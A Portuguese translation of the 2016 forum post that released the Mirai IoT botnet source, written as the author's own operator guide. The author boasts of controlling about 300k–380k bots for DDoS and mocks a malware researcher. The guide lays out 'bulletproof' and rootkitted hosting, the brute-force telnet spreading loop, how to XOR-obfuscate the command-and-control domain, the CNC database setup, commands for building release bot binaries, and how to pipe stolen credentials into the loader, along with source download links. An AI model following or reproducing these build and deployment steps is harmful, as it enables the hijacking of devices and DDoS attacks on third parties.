* Texto original de: [Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)
* Data da postagem: Fri 30 Sep 19:50:52 UTC 2016
* [Ver aquivo original](ForumPost.txt)

# Nota do tradutor

Traduzi sendo o mais fiel que pude, não retirando os xingamentos do post original. Brinquei com os termos da Anna em alguns momentos, mas para manter o sentido das piadas. Sobre os termos em inglês, mantive quando EU achei necessário para que alguém da área pudesse compreender. 

# Prefácio

Olá a todooox,

Quando inicialmente eu fui para a indústria do DDoS, eu não estava planejando ficar muito tempo. 
Eu fiz o meu primeiro dinheiro, tem muitos olhos olhando para IoT agora, então é hora de ir embora.
De qualquer forma, eu conheço todo garoto e sua mãe, eles tem um sonho molhado de ter algo além do Qbot(um malware).

Então hoje, eu tenho um incrível lançamento para vocês. Com Mirai, eu usualmente subo no máximo
380k de bots da telnet sozinha. Contudo, depois do Kreb DDoS, ISOs tem lentamente desligando e limpando seus atos.
Hoje, o máximo de máquinas que subo fica por volta de 300k de bots, e diminuindo.

Então, eu sou sua senpai, e eu vou te tratar bem legal, meu hf-chan.

E a todos que estão achando que estão fazendo alguma coisa acertando meu CNC, eu dei boas risadas, esse bot usa domínio para o CNC. leva 60 segundos para todos se reconectarem, LOL.

Também, mensagem para esta postagem do blog por malwaremustdie

* http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html
* https://web.archive.org/web/20160930230210/http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html
  <- backup backup no caso do engenheiro de engenharia reversa de baixa qualidade unixfreaxjp decida editar
esse post, lol.

Tinha muito respeito por você, pensava que você era um bom reverser, mas você
realmente falhou completamente e totalmente em reverter esse binário. 
"Nós ainda temos um melhor kung fu que vocês crianças" não me faça rir por favor, você fez tantos erros
e ainda me confundiu em alguns binários diferentes. LOL

Deixem me dar em você alguns tapas de volta -
1. Porta  `48101`  não é para back connect, é um controle para prevenir múltiplas
 instâncias do bot rodar juntas

2. `/dev/watchdog` e `/dev/misc` não são para "fazer o dalay", é para prevenir 
que o sistema congele (nota, em inglês está o termo hanging). Isso é um low-hanging fruit,
é muito triste que você seja extremamente burro.

3. Você falhou e pensou que `FAKE_CNC_ADDR` e `FAKE_CNC_PORT` era o real CNC, lol
"E fazia o backdor se conectando via HTTP na 65.222.202.53". Você tropeçou no fluxo de sinal ;)
tente melhor criança

4. Seu esqueleto da ferramenta chupa cu, ele pensa que o attacke decodificado como "sinden style",
mas ele nem mesmo usa um protocolo text-based? CNC e bot se cominicam sobre um protocolo binário

5. Você disse 'chroot("/") tão previsível como torlus' mas você não entendeu, outros
matam baseados no cwd. Isso mostra como fora-do-laço você é com malwares reais. Volte para a skidlândia

5 tapas para você

Por que você está escrevendo ferramentas de engenharia reversa? Você nem mesmo consegue fazer um reverso
em primeiro lugar. Por favor aprenda alguns skills antes de tentar impressionar os outros.
Sua arrogância em declarar como você "me bateu" com seu  argumento idiota de kung fu me fez rir
tanto enquanto eu estava comendo meu SO que tive de me dar uns tapinhas nas costas.


Assim como eu estou sempre livre, você está condenado a mediocracia para sempre.




# Requerimentos

### Bare Mínimo

2 servidores: 1 para CNC + mysql, 1 para o recebedor do scan e 1+ para carga(nt: loading no original)

### Pro Setup (meu setup)

2 VPS e 4 servidores

* 1 VPS com um host extremamente a prova de balas para o servidor de banco de dados
* 1 VPS, rootkittizado, para scanReceiver e distribuidor
* 1 servidor para CNC (geralmente usa 2% CPU com 400k bots)
* 3x servidores 10gbps NForce para carga (o distribuidor distribui para os 3 serves de forma igual)


# Overview da infraestrutura

* Para estabelecer a conexão com CNC, os bots resolvem o domínio
  ([`resolv.c`](mirai/bot/resolv.c)/[`resolv.h`](mirai/bot/resolv.h)) e se 
  conecta com aquele IP específico
* Bots de telnet brutos usam um scanner de SYN avançado que é aproximadamente 80x mais rápido
do que no Qbot, e usa 20x menos recursos. Quando acha um resultado bruto, o bot resolve outro domínio e reporta.
Isso é ligado com um servidor separado que é automaticamente carregado nos dispositivos assim que o resultado chega
*Resultados brutos são enviados por padrão na porta 48101. A utilidade chamada scanListen.go nas ferramentas
é usada para receber resultados brutos (eu estava tendo aproximadamente 500 resultados brutos por segundo no pico).


Mirai utiliza um mecanismo de espalhamento similar a se auto replicar, porém eu chamop de
"real-time-load". Basicamente, bots de resultados brutos, enviam para um servidor escutando com 
o mecanismo `scanListen`, o qual envia resultados para o loader. Esse loop (`brute -> scanListen -> load -> brute`) é conhecido como o tempo real de carregamento.

O loader pode ser configurado para usar múltiplos endereços IP para bypassar a exaustão de porta do linux (existe um limite do número de portas disponíveis, o que significa que não tem o suficiente para uma variação na tupla para ter mais do que 65k de saídas externas - em teoría, esse valor é muito menor na prática). Eu tenho por volta de 60k-70k de conexões simultâneas externas (carregamento simultâneo) espalhado por 5 IPs.



# configurando o bot

O bot tem diversas opções de configurações que são obfuscadas em `table.c/table.h`.
Em [`./mirai/bot/table.h`](mirai/bot/table.h) nós podemos achar a maioria das descrições para
as opções de configurações. Entretanto, em [`./mirai/bot/table.c`](mirai/bot/table.c)
existem algumas opções que você *precisa* mudar para continuar funcionando.


* `TABLE_CNC_DOMAIN` - Domain name do CNC para conecta para - evitador de DDoS bem divertido com a mirai
  Domain name of CNC to connect to - DDoS avoidance é muito divertido com mirai, as pessoas tentão se
  conectar com meu CNC mas eu atualizo mais rápido do que eles conseguem achar meu novo endereço de IPs, 
  lol. Retardados :)
* `TABLE_CNC_PORT` - Porta para conectar para, já definida na 23
* `TABLE_SCAN_CB_DOMAIN` - Quando encontra resultados brutos, esse domínio é reportado para
* `TABLE_SCAN_CB_PORT` - Porta para conectar para por resultados brutos, já está configurada para
  `48101`.

Em [`./mirai/tools`](mirai/tools) você irá encontrar algo chamado enc.c - você
deve compilar ele para ter saída de coisas para colocar no arquivo table.c

Rode isso dentro do diretório da mirai

    ./build.sh debug telnet

Você terá alguns erros relacionados ao cross-compile não estar lá se você não os tiver configurado.
Isso é ok, não afetará a compilação da ferramenta enc

Agora, na pasta `./mirai/debug` você deve ver um binário compilado chamaco enc.
Por exemplo, para obfuscar uma string para o nome de domínip para os bots se conectarem, use isso:


    ./debug/enc string fuck.the.police.com

A saída deve ser algo como:

    XOR'ing 20 bytes of data...
    \x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22

Para atualizar o valor de `TABLE_CNC_DOMAIN` por exemplo, subtitua por uma string long hex
com a ferramenta enc. Também, você verá `XOR'ing 20 bytes of data`.
Esse valor deve ser trocado pelo último argumento. Como exemplo, a linha table.c
originalmente se parece assim


    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com

Agora que nós conhecemos o valor da ferramenta enc, nos iremos atualizar como

    add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22", 20); // fuck.the.police.com


Alguns valores são strings, alguns são portas  (uinte16 na ordem de rede / big endian).


# Configurando o CNC

    apt-get install mysql-server mysql-client

CNC requer uma database para funcionar. Quando você instala o database, entre nele e execute
os seguintes comandos: http://pastebin.com/86d0iL9g (ref:
[`db.sql`](scripts/db.sql))

Isso irá criar uma database para você. Para adicionar seu usuário,

    INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');

Agora, vá no arquivo [`./mirai/cnc/main.go`](mirai/cnc/main.go)

edite esses valores

    const DatabaseAddr string   = "127.0.0.1"
    const DatabaseUser string   = "root"
    const DatabasePass string   = "password"
    const DatabaseTable string  = "mirai"

Para informar para o mysql server que você acabou de instalar


# Setando os cross-compilers

Cross compilers são fáceis, siga as intruções nesse link para configurar tudo.
Você deve reiniciar seu sistema ou recarregar o arquivo .bashrc para essas mudanças poderem afetar.


http://pastebin.com/1rRCc3aD (ref:
[`cross-compile.sh`](scripts/cross-compile.sh))

# Construindo o CNC+Bot

O CNC, bot e ferramentas relacionadas:

1. http://santasbigcandycane.cx/mirai.src.zip - *ESSE LINK NÃO VAI DURAR PARA
  SEMPRE, 2 SEMANAS MAX - FAÇA BACKUP!*<br>
  ![mirai.src.zip contents](scripts/images/BVc7qJs.png)
2. http://santasbigcandycane.cx/loader.src.zip - *ESSE LINK NÃO VAI DURAR PARA
  SEMPRE, 2 SEMANAS MAX - FAÇA BACKUP!*

### Como contruir bot + CNC

Na pasta do mirai, existe o script [`build.sh`](mirai/build.sh) .

    ./build.sh debug telnet


Irá gerar binários de depuração do bot que não irão daemonizar e imprimir informações
sobre se ele pode se conectar ao CNC, etc, status de inundações, etc. Compile para a pasta
`./mirai/debug` 

    ./build.sh release telnet

Irá gerar saídas de binários prontos para a produção de bot que são extremamente despojados,
pequenos (aproximadamente 60K) que devem ser carregados nos dispositivos. Compile todos os binários no formato:
`mirai.$ARCH` para a pasta `./mirai/release`



# Construindo Echo Loader

Loader lê as entradas telnet da STDIN no seguinte formato:

    ip:port user:pass
ele detecta se tem wget ou tftp, e tenta baixar o binário usando isso. Se não, ficará ecoando um pequeno
binário (aproximadamente 1kb) que ira ser suficiente como um wget.

    ./build.sh

Irá construir o loader, optimizar, ter uso em produção, sem fuss. Se você tiver um aquivo
no formato usado para carregamento, você poderá fazer isso

    cat file.txt | ./loader

Lembre-se do `ulimit`!

Só para deixar claro, eu não estou providenciando nenhum tipo de tutorial de ajuda 1 para ou ou merda assim, leva muito tempo. Todos os scripts e tudomais são incluídos para setar uma botnet funcional em menos de 1 hora. Eu irei ajudar você se tiver questões individuais ( como o CNC não conecta a database, eu fiz assim assim blah blah), mas não questões como "Meu bot não conecta, concerte".

Traduzido porcamente por SlowHusky. O texto original está disponível nesse documento, então não precisa confiar na minha tradução.
